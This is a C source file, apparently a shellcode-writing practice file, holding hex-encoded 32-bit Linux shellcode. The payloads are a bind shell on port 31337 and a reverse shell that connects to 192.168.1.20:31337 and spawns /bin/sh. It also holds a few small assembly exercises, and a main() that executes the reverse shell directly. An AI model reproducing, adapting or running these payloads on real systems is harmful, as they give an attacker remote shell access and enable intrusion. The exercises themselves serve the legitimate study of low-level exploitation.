#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdbool.h>
#include <string.h>
#include <time.h>
#include <sys/ptrace.h>
#include <sys/reg.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <wait.h>
#include <sys/user.h>

/* bind port shellcode */
/* binds to port 31337 on any port */
char *bind = 
"\x31\xDB\xF7\xE3\x6A\x66\x58"        
"\x43\x52\x6A\x01\x6A\x02\x89"
"\xE1\xCD\x80\x96\x6A\x66\x58"
"\x43\x52\x66\x68\x7A\x69\x66"
"\x53\x89\xE1\x6A\x10\x51\x56"
"\x89\xE1\xCD\x80\x6A\x66\x58"
"\x43\x43\x53\x56\x89\xE1\xCD"
"\x80\x6A\x66\x58\x43\x52\x52"
"\x56\x89\xE1\xCD\x80\x93\x6A"
"\x02\x59\xB0\x3F\xCD\x80\x49"
"\x79\xF9\x50\x68\x2F\x2F\x73"
"\x68\x68\x2F\x62\x69\x6E\x89"
"\xE3\x41\xB0\x0B\xCD\x80";      


/* reverse shell shellcode */
/* free from null bytes if IP address and port is */
char *reverse_shell = 
"\x31\xDB\xF7\xE3\x6A\x66\x58"
"\xFE\xC3\x52\x6A\x01\x6A\x02"
"\x89\xE1\xCD\x80\x96\x31\xC0"      
"\xFE\xC3\x88\xDA\xFE\xC3\x6A"
"\x66\x58\x68"
"\xC0\xA8\x01\x14"   // <--------- IP Address 192.168.1.20   
"\x66"
"\x68\x7A\x69" 		//  <---------- PORT 31337
"\x66\x52\x66\x31\xD2\x89\xE1"      
"\x6A\x10\x51\x56\x89\xE1\xCD"
"\x80\x89\xF3\x6A\x02\x59\xB0"
"\x3F\xCD\x80\x49\x79\xF9\xEB"
"\x08\x5B\x50\x89\xE1\xB0\x0B"
"\xCD\x80\xE8\xF3\xFF\xFF\xFF"
"\x2F\x62\x69\x6E\x2F\x2F\x73\x68";      


/* Demonstrating function arguments in asm */
char *foo = 
"\x31\xDB\xF7\xE3\xB0\x01"      
"\x43\xE8\x0A\x00\x00\x00"
"\xFE\xC0\x53\x89\xE3"      
"\xE8\x01\x00\x00\x00\xC3\xC3";

/* A series of challenges */
/* Test the ability to craft function arguments */
char *challenge_1 = 
"\x31\xDB\xF7\xE3\x31\xC9\xB3\x05"      
"\xB1\x04\xB2\x03\xE8\x1C\x00\x00\x00"
"\x6A\x03\x6A\x04\x6A\x05"      
"\x89\xE3\xE8\x25\x00\x00\x00"
"\xEB\x00\x6A\x03\x6A\x04"      
"\x89\xE1\xB3\x05\xE8\x2A\x00\x00\x00"
"\x80\xFB\x05\x75\x73"      
"\x80\xF9\x04\x75\x6E\x80\xFA\x03"    
"\x75\x69\x31\xDB\xF7\xE3"      
"\x31\xC9\xC3\x31\xFF\xF7\xE7"      
"\x87\xFB\x8A\x1F\x8A\x4F\x04"    
"\x8A\x57\x08\xE8\xD7\xFF\xFF\xFF"
"\xC3\x89\xCF\x31\xC9\x8A\x0F"      
"\x8A\x57\x04\xE8\xC8\xFF\xFF\xFF"
"\xEB\x25\x31\xDB\xF7\xE3"      
"\xB0\xFF\x8B\x3C\x24\x8B\x2c\x24"      
"\xFC\xB9\xFF\xFF\xFF\xFF"
"\xF2\xAE\x4F\x29\xEF"      
"\x89\xFA\x89\xE9\xB0\x04"      
"\xCD\x80\x31\xC0\xB0\x01"      
"\xCD\x80\xE8\xD6\xFF\xFF\xFF"
"\x5B\x2B\x5D\x20\x57"        
"\x65\x6C\x6C\x20\x44\x6F\x6E"  
"\x65\x21\x21\x20\x5B\x2B"    
"\x5D\xFF\xE8\xBD\xFF\xFF\xFF"
"\x5B\x2D\x5D\x20\x54\x72"
"\x79\x20\x48\x61\x72\x64"      
"\x65\x72\x20\x5B\x2D\x5D\xFF";

 
/* Testing strlen in asm */
char *repne_test = 
"\xEB\x1E\x31\xDB\xF7\xE3"      
"\xB0\xFF\x89\xE7\x89\xE5\xFC"        
"\xB9\xFF\xFF\xFF\xFF\xF2\xAE\x4F\x29\xEF"
"\x89\xFA\x8B\x4D\x00\xB0\x04\xCD\x80"
"\xE8\xDD\xFF\xFF\xFF\x41\x41\x41\x41\x41"        
"\x41\x41\x41\x41\x41\x41\x41\xFF";        


int main()
{
  printf("[+] len = %d [+]\n", strlen(reverse_shell));
  
  (*(void  (*)()) reverse_shell)();

  
}
